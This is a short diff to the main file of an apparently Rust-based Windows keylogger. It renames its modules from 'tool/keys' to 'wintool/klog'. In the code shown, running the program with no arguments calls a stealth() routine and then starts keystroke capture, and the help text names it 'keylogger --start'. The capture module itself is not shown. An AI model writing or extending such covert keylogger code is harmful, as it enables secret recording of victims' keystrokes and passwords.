@@ -3,9 +3,9 @@ extern crate winapi;
 use winapi::um::{wincon, consoleapi, winuser};
 use std::env;
 
-mod tool;
+mod wintool;
 
-use tool::keys;
+use wintool::klog;
 
 
 fn stealth() {
@@ -26,12 +26,12 @@ fn main() {
             if param == "--help" {
                 return println!("{:?}", "keylogger --start");
             }else if  param == "--start" {
-                keys::start();
+                klog::start();
             }
         }
         None => {
             stealth();
-            keys::start();
+            klog::start();
         }
     }
 }
